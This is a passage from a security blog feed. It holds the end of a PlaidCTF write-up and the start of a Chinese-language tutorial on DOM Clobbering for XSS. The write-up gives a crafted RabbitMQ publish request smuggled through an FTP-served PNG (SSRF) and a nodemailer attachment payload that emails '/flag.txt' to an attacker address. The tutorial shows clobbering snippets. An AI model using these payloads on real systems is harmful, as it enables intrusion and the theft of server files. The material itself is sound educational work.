class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> email !== <span class="hljs-string">&quot;string&quot;</span>) {</span><br><span class="line">    res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&quot;Bad body&quot;</span>);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">let</span> newPassword = <span class="hljs-built_in">Array</span>.from(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">16</span>), <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span>[<span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">36</span>)]).join(<span class="hljs-string">&quot;&quot;</span>);</span><br><span class="line">  <span class="hljs-keyword">let</span> hashedPassword = <span class="hljs-keyword">await</span> bcrypt.hash(newPassword, <span class="hljs-number">14</span>);</span><br><span class="line">  <span class="hljs-keyword">await</span> withClient(<span class="hljs-function">(<span class="hljs-params">client</span>) =&gt;</span> client.query(<span class="hljs-string">`</span></span><br><span class="line"><span class="hljs-string">UPDATE user_auth</span></span><br><span class="line"><span class="hljs-string">SET password = $2</span></span><br><span class="line"><span class="hljs-string">WHERE email = $1</span></span><br><span class="line"><span class="hljs-string">`</span>, [email, hashedPassword]));</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">let</span> channel = <span class="hljs-keyword">await</span> rabbit.createChannel();</span><br><span class="line">  channel.sendToQueue(<span class="hljs-string">&quot;email&quot;</span>, Buffer.from(<span class="hljs-built_in">JSON</span>.stringify({</span><br><span class="line">    to: email,</span><br><span class="line">    subject: <span class="hljs-string">&quot;Password Reset&quot;</span>,</span><br><span class="line">    text: <span class="hljs-string">`Hello there, your new password is <span class="hljs-subst">${newPassword}</span>`</span>,</span><br><span class="line">  })));</span><br><span class="line"></span><br><span class="line">  res.status(<span class="hljs-number">200</span>).send(<span class="hljs-string">&quot;Password reset&quot;</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>It seems we can&#x2019;t control the <code>${newPassword}</code>. But I find a way to get flag through reading nodemailer&#x2019;s documentation.</p><p><a href="https://nodemailer.com/message/attachments/" target="_blank" rel="noopener">https://nodemailer.com/message/attachments/</a></p><p>We can send an email containing the flag as attachment! We can make a json like this:</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-attr">&quot;to&quot;</span>:<span class="hljs-string">&quot;your@gmail.com&quot;</span>,<span class="hljs-attr">&quot;subject&quot;</span>:<span class="hljs-string">&quot;Password Reset&quot;</span>,<span class="hljs-attr">&quot;text&quot;</span>:<span class="hljs-string">&quot;Hello there, your new password is newpass&quot;</span>,<span class="hljs-attr">&quot;attachments&quot;</span>:[{<span class="hljs-attr">&quot;filename&quot;</span>:<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-attr">&quot;path&quot;</span>:<span class="hljs-string">&quot;/flag.txt&quot;</span>}]}</span><br></pre></td></tr></tbody></table></figure><p></p><p>So what we need to do is to control nodemailer to send our message.</p><h2 id="rabbitmq"><a href="#rabbitmq" class="headerlink" title="rabbitmq"></a>rabbitmq</h2><p>services/email/index.ts</p><p></p><figure class="highlight typescript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> channel = <span class="hljs-keyword">await</span> rabbit.createChannel();</span><br><span class="line">channel.consume(<span class="hljs-string">&quot;email&quot;</span>, <span class="hljs-keyword">async</span> (msg) =&gt; {</span><br><span class="line">  <span class="hljs-keyword">if</span> (msg === <span class="hljs-literal">null</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span>;</span><br><span class="line">  }</span><br><span class="line">  channel.ack(msg);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">try</span> {</span><br><span class="line">    <span class="hljs-keyword">let</span> data = <span class="hljs-built_in">JSON</span>.parse(msg.content.toString());</span><br><span class="line">    <span class="hljs-keyword">await</span> transport.sendMail({</span><br><span class="line">      <span class="hljs-keyword">from</span>: <span class="hljs-string">&quot;plaid2020problem@gmail.com&quot;</span>,</span><br><span class="line">      subject: <span class="hljs-string">&quot;Your Account&quot;</span>,</span><br><span class="line">      ...data,</span><br><span class="line">    });</span><br><span class="line">  } <span class="hljs-keyword">catch</span> (e) {</span><br><span class="line">    <span class="hljs-built_in">console</span>.error(e);</span><br><span class="line">  }</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><p></p><p>And we can find how server sendemail here. It uses rabbitmq. And rabbitmq has got web api. </p><p>So it seems we can control what nodemailer send through rabbitmq&#x2019;s web api.</p><p>But how can we send http request to rabbitmq? It seems we have got the method how to get flag and the method let ftp server build TCP connection with arbitrary server.</p><p>It seems we need a connection with them!</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF!"></a>SSRF!</h2><p>The last key to solve this problem is let the ftp server send a http request to rabbitmq server.</p><p>But how?</p><p>We notice that we can hide a http message in the profile png and use <code>RRETR</code> to let the ftp server return the message of png.</p><p><img src="/images/plaid-ctf/3.png" alt></p><p>And use <code>REST 6</code> to cut the message, make the response like a http message. This is similar with http response splitting.</p><p>So when ftp server return the data of profile picture, it will return data like this:</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/exchanges/%2f/amq%2edefault/publish</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: 172.32.56.72:15672</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="hljs-attribute">authorization</span>: Basic dGVzdDp0ZXN0</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 300</span><br><span class="line"></span><br><span class="line">{&quot;properties&quot;:{},&quot;routing_key&quot;:&quot;email&quot;,&quot;payload&quot;:&quot;your_payload&quot;,&quot;payload_encoding&quot;:&quot;base64&quot;}</span><br></pre></td></tr></tbody></table></figure><p></p><p>But the TCP connection is not persisted, we can&#x2019;t get the response of rabbitmq server and most importantly we can&#x2019;t add a new message in rabbitmq queue. </p><p>During the competition, we have to frequently send lots of requests to api server. Hope some requests can exploit successfully. At last we made it once.</p><p>After ctf ends, @zwad3, the author of this chall, replied to me.</p><div class="twitter-wrapper"><blockquote class="twitter-tweet"><a href="https://twitter.com/zwad3/status/1252087190278082562" target="_blank" rel="noopener"></a></blockquote></div><script async defer src="//platform.twitter.com/widgets.js" charset="utf-8"></script><p>He mentioned we should send the real request followed by 50,000 dumb requests (in one file). I tried this method today and this really gave 100% success rate.</p><p><img src="/images/plaid-ctf/3.png" alt></p><p>Just like this, I put 1000 http get requests in one file and every time can get flag.</p><p><img src="/images/plaid-ctf/4.png" alt></p><p>Interesting challange! Hope u enjoy!</p></body></html>]]></content>
        <author>
            <name><![CDATA[Zeddâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/</id>
        <title><![CDATA[ä½¿ç”¨ Dom Clobbering æ‰©å±• XSS]]></title>
        <updated>2020-05-05T17:31:59+08:00</updated>
        <link href="https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/"><![CDATA[<html><head></head><body><p>&#x524D;&#x51E0;&#x5929; PortSwigger &#x53D1;&#x5E03;&#x4E86; <a href="https://portswigger.net/research/top-10-web-hacking-techniques-of-2019" target="_blank" rel="noopener">Top 10 web hacking techniques of 2019</a>&#xFF0C;&#x699C;&#x4E0A;&#x7684;&#x653B;&#x51FB;&#x6280;&#x672F;&#x90FD;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#xFF0C;p&#x725B;&#x4E5F;&#x80AF;&#x5B9A;&#x4F1A;&#x5728;&#x5C0F;&#x5BC6;&#x5708;&#x505A;&#x5206;&#x4EAB;&#x7684;&#xFF08;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x8BDD;&#x672C;&#x83DC;&#x4E5F;&#x4F1A;&#x5728;&#x81EA;&#x5DF1;<a href="https://blog.zeddyu.info">&#x535A;&#x5BA2;</a>&#x505A;&#x505A;&#x5B66;&#x4E60;&#x5206;&#x4EAB;&#xFF09;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x804A; Top 10 &#x6280;&#x672F;&#x4E86;&#xFF0C;&#x5C31;&#x770B;&#x770B;&#x5728; Top 10 &#x63D0;&#x540D;&#x7ED3;&#x679C;&#x6CA1;&#x4E0A;&#x699C;&#x4F46;&#x662F;&#x4F9D;&#x65E7;&#x5F88;&#x6709;&#x610F;&#x601D;&#x7684;&#x6280;&#x672F; Dom Clobbering&#x3002;</p><blockquote class="colorquote success"><p>&#x6587;&#x7AE0;&#x9996;&#x53D1;&#x4E8E;&#x5148;&#x77E5;&#x793E;&#x533A;&#xFF1A;<a href="https://xz.aliyun.com/t/7329" target="_blank" rel="noopener">https://xz.aliyun.com/t/7329</a></p></blockquote><a id="more"></a><h2 id="Basics"><a href="#Basics" class="headerlink" title="Basics"></a>Basics</h2><p>From <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction" target="_blank" rel="noopener">MDN Web Docs</a>:</p><blockquote><p>&#x200B;    The Document Object Model (DOM) is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style, and content. The DOM represents the document as nodes and objects. That way, programming languages can connect to the page.</p><p>A Web page is a document. This document can be either displayed in the browser window or as the HTML source. But it is the same document in both cases. The Document Object Model (DOM) represents that same document so it can be manipulated. The DOM is an object-oriented representation of the web page, which can be modified with a scripting language such as JavaScript.</p><p>The <a href="http://www.w3.org/DOM/" target="_blank" rel="noopener">W3C DOM</a> and <a href="https://dom.spec.whatwg.org/" target="_blank" rel="noopener">WHATWG DOM</a> standards are implemented in most modern browsers. Many browsers extend the standard, so care must be exercised when using them on the web where documents may be accessed by various browsers with different DOMs.</p></blockquote><p>DOM &#x6700;&#x521D;&#x662F;&#x5728;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x6807;&#x51C6;&#x5316;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x8BDE;&#x751F;&#x548C;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x8FD9;&#x5BFC;&#x81F4;&#x4E86;&#x8BB8;&#x591A;&#x7279;&#x6B8A;&#x7684;&#x884C;&#x4E3A;&#xFF0C;&#x4F46;&#x662F;&#x4E3A;&#x4E86;&#x4FDD;&#x6301;&#x517C;&#x5BB9;&#x6027;&#xFF0C;&#x5F88;&#x591A;&#x6D4F;&#x89C8;&#x5668;&#x4ECD;&#x7136;&#x652F;&#x6301;&#x5F02;&#x5E38;&#x7684; DOM &#x3002;</p><p>DOM &#x7684;&#x65E7;&#x7248;&#x672C;&#xFF08;&#x5373;DOM Level 0 &amp; 1&#xFF09;&#x4EC5;&#x63D0;&#x4F9B;&#x4E86;&#x6709;&#x9650;&#x7684;&#x901A;&#x8FC7; JavaScript &#x5F15;&#x7528;&#x5143;&#x7D20;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x4E00;&#x4E9B;&#x7ECF;&#x5E38;&#x4F7F;&#x7528;&#x7684;&#x5143;&#x7D20;&#x5177;&#x6709;&#x4E13;&#x7528;&#x7684;&#x96C6;&#x5408;&#xFF08;&#x4F8B;&#x5982;<code>document.forms</code>&#xFF09;&#xFF0C;&#x800C;&#x5176;&#x4ED6;&#x5143;&#x7D20;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>Window</code>&#x548C;<code>Document</code>&#x5BF9;&#x8C61;&#x4E0A;&#x7684;<code>name</code>&#x5C5E;&#x6027;&#x548C;<code>id</code>&#x5C5E;&#x6027;&#x6765;&#x5F15;&#x7528;&#xFF0C;</p><p>&#x663E;&#x7136;&#xFF0C;&#x652F;&#x6301;&#x8FD9;&#x4E9B;&#x5F15;&#x7528;&#x65B9;&#x5F0F;&#x4F1A;&#x5F15;&#x8D77;&#x6DF7;&#x6DC6;&#xFF0C;&#x5373;&#x4F7F;&#x8F83;&#x65B0;&#x7684;&#x89C4;&#x8303;&#x8BD5;&#x56FE;&#x89E3;&#x51B3;&#x6B64;&#x95EE;&#x9898;&#xFF0C;&#x4F46;&#x662F;&#x4E3A;&#x4E86;&#x5411;&#x540E;&#x517C;&#x5BB9;&#xFF0C;&#x5927;&#x591A;&#x6570;&#x884C;&#x4E3A;&#x90FD;&#x4E0D;&#x80FD;&#x8F7B;&#x6613;&#x66F4;&#x6539;&#x3002;&#x5E76;&#x4E14;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x4E4B;&#x95F4;&#x6CA1;&#x6709;&#x5171;&#x8BC6;&#xFF0C;&#x56E0;&#x6B64;&#x6BCF;&#x4E2A;&#x6D4F;&#x89C8;&#x5668;&#x53EF;&#x80FD;&#x9075;&#x5FAA;&#x4E0D;&#x540C;&#x7684;&#x89C4;&#x8303;&#xFF08;&#x751A;&#x81F3;&#x6839;&#x672C;&#x6CA1;&#x6709;&#x6807;&#x51C6;&#xFF09;&#x3002;&#x663E;&#x7136;&#xFF0C;&#x7F3A;&#x4E4F;&#x6807;&#x51C6;&#x5316;&#x610F;&#x5473;&#x7740;&#x786E;&#x4FDD;DOM&#x7684;&#x5B89;&#x5168;&#x662F;&#x4E00;&#x9879;&#x91CD;&#x5927;&#x6311;&#x6218;&#x3002;</p><p>&#x7531;&#x4E8E;&#x975E;&#x6807;&#x51C6;&#x5316;&#x7684; DOM &#x884C;&#x4E3A;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x6709;&#x65F6;&#x53EF;&#x80FD;&#x4F1A;&#x5411;&#x5404;&#x79CD; DOM &#x5143;&#x7D20;&#x6DFB;&#x52A0; name &amp; id &#x5C5E;&#x6027;&#xFF0C;&#x4F5C;&#x4E3A;&#x5BF9;&#x6587;&#x6863;&#x6216;&#x5168;&#x5C40;&#x5BF9;&#x8C61;&#x7684;&#x5C5E;&#x6027;&#x5F15;&#x7528;&#xFF0C;&#x4F46;&#x662F;&#xFF0C;&#x8FD9;&#x4F1A;&#x5BFC;&#x81F4;&#x8986;&#x76D6;&#x6389; document&#x539F;&#x6709;&#x7684;&#x5C5E;&#x6027;&#x6216;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#xFF0C;&#x6216;&#x8005;&#x52AB;&#x6301;&#x4E00;&#x4E9B;&#x53D8;&#x91CF;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x800C;&#x4E14;&#x4E0D;&#x540C;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x8FD8;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x89E3;&#x6790;&#x65B9;&#x5F0F;&#xFF0C;&#x6240;&#x4EE5;&#x672C;&#x6587;&#x7684;&#x5185;&#x5BB9;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x7279;&#x522B;&#x6807;&#x6CE8;&#xFF0C;&#x5747;&#x9ED8;&#x8BA4;&#x5728; <strong>Chrome 80.0.3987.116</strong> &#x7248;&#x672C;&#x4E0A;&#x8FDB;&#x884C;&#x3002; </p><p>Dom Clobbering &#x5C31;&#x662F;&#x4E00;&#x79CD;&#x5C06; HTML &#x4EE3;&#x7801;&#x6CE8;&#x5165;&#x9875;&#x9762;&#x4E2D;&#x4EE5;&#x64CD;&#x7EB5; DOM &#x5E76;&#x6700;&#x7EC8;&#x66F4;&#x6539;&#x9875;&#x9762;&#x4E0A; JavaScript &#x884C;&#x4E3A;&#x7684;&#x6280;&#x672F;&#x3002; &#x5728;&#x65E0;&#x6CD5;&#x76F4;&#x63A5; XSS &#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5F80; DOM Clobbering &#x8FD9;&#x65B9;&#x5411;&#x8003;&#x8651;&#x4E86;&#x3002; </p><h2 id="Simple-Example"><a href="#Simple-Example" class="headerlink" title="Simple Example"></a>Simple Example</h2><p>&#x5176;&#x5B9E; Dom Clobbering &#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x6211;&#x4EEC;&#x770B;&#x51E0;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#x5C31;&#x80FD;&#x77E5;&#x9053;&#x5B83;&#x662F;&#x5E72;&#x4EC0;&#x4E48;&#x4E86;&#x7684;&#x3002;</p><h3 id="Exmaple-1-Create"><a href="#Exmaple-1-Create" class="headerlink" title="Exmaple 1 - Create"></a>Exmaple 1 - Create</h3><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225164841.png" alt></p><p>&#x4ECE;&#x56FE;&#x4E2D;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x901A;&#x8FC7; id &#x6216;&#x8005; name &#x5C5E;&#x6027;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;<code>document</code>&#x6216;&#x8005;<code>window</code>&#x5BF9;&#x8C61;&#x4E0B;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x3002;</p><h3 id="Example-2-Overwrite"><a href="#Example-2-Overwrite" class="headerlink" title="Example 2 - Overwrite"></a>Example 2 - Overwrite</h3><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200222145150.png" alt></p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;<code>document.cookie</code>&#x5DF2;&#x7ECF;&#x88AB;&#x6211;&#x4EEC;&#x7528; img &#x6807;&#x7B7E;&#x7ED9;&#x8986;&#x76D6;&#x4E86;</p><h3 id="Example-3-Overwrite2"><a href="#Example-3-Overwrite2" class="headerlink" title="Example 3 - Overwrite2"></a>Example 3 - Overwrite2</h3><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225165624.png" alt></p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6211;&#x4EEC;&#x901A;&#x8FC7;&#x591A;&#x5C42;&#x8986;&#x76D6;&#x6389;&#x4E86;<code>document.body.appendChild</code>&#x65B9;&#x6CD5;&#x3002;</p><h2 id="Attack-Method"><a href="#Attack-Method" class="headerlink" title="Attack Method"></a>Attack Method</h2><p>&#x65E2;&#x7136;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x53BB;&#x521B;&#x5EFA;&#x6216;&#x8005;&#x8986;&#x76D6; document &#x6216;&#x8005; window &#x5BF9;&#x8C61;&#x7684;&#x67D0;&#x4E9B;&#x503C;&#xFF0C;&#x4F46;&#x662F;&#x770B;&#x8D77;&#x6765;&#x6211;&#x4EEC;&#x4E3E;&#x7684;&#x4F8B;&#x5B50;&#x53EA;&#x662F;&#x5229;&#x7528;&#x6807;&#x7B7E;&#x521B;&#x5EFA;&#x6216;&#x8005;&#x8986;&#x76D6;&#x6700;&#x7EC8;&#x5F97;&#x5230;&#x7684;&#x4E5F;&#x662F;&#x6807;&#x7B7E;&#xFF0C;&#x662F;&#x4E00;&#x4E2A;<code>HTMLElment</code>&#x5BF9;&#x8C61;&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225170736.png" alt></p><p>&#x4F46;&#x662F;&#x5BF9;&#x4E8E;&#x5927;&#x591A;&#x6570;&#x60C5;&#x51B5;&#x6765;&#x8BF4;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x80FD;&#x66F4;&#x9700;&#x8981;&#x5C06;&#x5176;&#x8F6C;&#x6362;&#x4E3A;&#x4E00;&#x4E2A;&#x53EF;&#x63A7;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#xFF0C;&#x4EE5;&#x4FBF;&#x6211;&#x4EEC;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#x3002;</p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString"></a>toString</h3><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4EE5;&#x4E0B;&#x4EE3;&#x7801;&#x6765;&#x8FDB;&#x884C; fuzz &#x5F97;&#x5230;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>toString</code>&#x65B9;&#x6CD5;&#x5C06;&#x5176;&#x8F6C;&#x6362;&#x6210;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x7684;&#x6807;&#x7B7E;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">Object</span>.getOwnPropertyNames(<span class="hljs-built_in">window</span>)</span><br><span class="line">.filter(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> p.match(<span class="hljs-regexp">/Element$/</span>))</span><br><span class="line">.map(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> <span class="hljs-built_in">window</span>[p])</span><br><span class="line">.filter(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> p &amp;&amp; p.prototype &amp;&amp; p.prototype.toString !== <span class="hljs-built_in">Object</span>.prototype.toString)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4E24;&#x79CD;&#x6807;&#x7B7E;&#x5BF9;&#x8C61;&#xFF1A;<code>HTMLAreaElement (&lt;area&gt;)</code>&amp; <code>HTMLAnchorElement (&lt;a&gt;)</code>&#xFF0C;&#x8FD9;&#x4E24;&#x4E2A;&#x6807;&#x7B7E;&#x5BF9;&#x8C61;&#x6211;&#x4EEC;&#x90FD;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>href</code>&#x5C5E;&#x6027;&#x6765;&#x8FDB;&#x884C;&#x5B57;&#x7B26;&#x4E32;&#x8F6C;&#x6362;&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225225659.png" alt></p><h3 id="HTMLCollection"><a href="#HTMLCollection" class="headerlink" title="HTMLCollection"></a>HTMLCollection</h3><p>&#x4F46;&#x662F;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7684;&#x662F;<code>x.y</code>&#x8FD9;&#x79CD;&#x5F62;&#x5F0F;&#x5462;&#xFF1F;&#x4E24;&#x5C42;&#x7ED3;&#x6784;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x600E;&#x4E48;&#x529E;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4E0A;&#x8FF0;&#x7684;&#x529E;&#x6CD5;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">y</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&apos;1:hasaki&apos;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">  alert(x.y);</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x65E0;&#x8BBA;&#x7B2C;&#x4E00;&#x4E2A;&#x6807;&#x7B7E;&#x600E;&#x4E48;&#x7EC4;&#x5408;&#xFF0C;&#x5F97;&#x5230;&#x7684;&#x7ED3;&#x679C;&#x90FD;&#x53EA;&#x662F;<code>undefined</code>&#x3002;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x53E6;&#x4E00;&#x79CD;&#x65B9;&#x6CD5;&#x52A0;&#x5165;&#x5F15;&#x5165; name &#x5C5E;&#x6027;&#x5C31;&#x4F1A;&#x6709;&#x5176;&#x4ED6;&#x7684;&#x6548;&#x679C;&#x3002;</p><p><code>HTMLCollection</code>&#x662F;&#x4E00;&#x4E2A;<code>element</code>&#x7684;&#x201C;&#x96C6;&#x5408;&#x201D;&#x7C7B;&#xFF0C;&#x5728;&#x6700;&#x65B0;&#x7684; <a href="https://dom.spec.whatwg.org/#interface-htmlcollection" target="_blank" rel="noopener">Dom &#x6807;&#x51C6;</a>&#x4E2D; IDL &#x63CF;&#x8FF0;&#x5982;&#x4E0B;&#xFF1A;</p><blockquote><p>[Exposed=Window, LegacyUnenumerableNamedProperties]<br>interface HTMLCollection {<br>  readonly attribute unsigned long length;<br>  getter Element? item(unsigned long index);<br>  getter Element? namedItem(DOMString name);<br>};</p></blockquote><p>&#x6587;&#x4E2D;&#x4E5F;&#x63D0;&#x5230;&#x4E86;</p><blockquote><p>&#x200B;    <code>HTMLCollection</code> <em>is a historical artifact we cannot rid the web of. While developers are of course welcome to keep using it, new API standard designers ought not to use it (use</em> <code>sequence</code> <em>in IDL instead).</em></p></blockquote><p>&#x5B83;&#x662F;&#x4E00;&#x79CD;&#x5386;&#x53F2;&#x4EA7;&#x7269;&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x4ECA;&#x5929;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x7EE7;&#x7EED;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x7C7B;&#xFF0C;&#x53EA;&#x662F;&#x5BF9;&#x4E8E; API &#x6807;&#x51C6;&#x8BBE;&#x8BA1;&#x8005;&#x4E0D;&#x63A8;&#x8350;&#x518D;&#x4F7F;&#x7528;&#x3002;</p><p>&#x5173;&#x4E8E;&#x5B83;&#x7684;&#x7528;&#x6CD5;&#xFF1A;</p><blockquote><p>collection . <code>length</code></p><p>&#x200B;    Returns the number of <a href="https://dom.spec.whatwg.org/#concept-element" target="_blank" rel="noopener">elements</a> in the <a href="https://dom.spec.whatwg.org/#concept-collection" target="_blank" rel="noopener">collection</a>.</p><p>element = collection . <code>item(index)</code></p><p>element = collection[index]</p><p>&#x200B;    Returns the <a href="https://dom.spec.whatwg.org/#concept-element" target="_blank" rel="noopener">element</a> with index index from the <a href="https://dom.spec.whatwg.org/#concept-collection" target="_blank" rel="noopener">collection</a>. The <a href="https://dom.spec.whatwg.org/#concept-element" target="_blank" rel="noopener">elements</a> are sorted in <a href="https://dom.spec.whatwg.org/#concept-tree-order" target="_blank" rel="noopener">tree order</a>.</p><p>element = collection . <code>namedItem(name)</code></p><p>element = collection[name]</p><p>&#x200B;    Returns the first <a href="https://dom.spec.whatwg.org/#concept-element" target="_blank" rel="noopener">element</a> with <a href="https://dom.spec.whatwg.org/#concept-id" target="_blank" rel="noopener">ID</a> or name name from the collection.</p></blockquote><p>&#x8BA9;&#x6211;&#x4EEC;&#x503C;&#x5F97;&#x6CE8;&#x610F;&#x7684;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>collection[name]</code>&#x7684;&#x5F62;&#x5F0F;&#x6765;&#x8C03;&#x7528;&#x5176;&#x4E2D;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x4F3C;&#x4E4E;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5148;&#x6784;&#x5EFA;&#x4E00;&#x4E2A;<code>HTMLCollection</code>&#xFF0C;&#x518D;&#x901A;&#x8FC7;<code>collection[name]</code>&#x7684;&#x5F62;&#x5F0F;&#x6765;&#x8C03;&#x7528;&#x3002;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;x&quot;</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">y</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;1:hasaki&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span 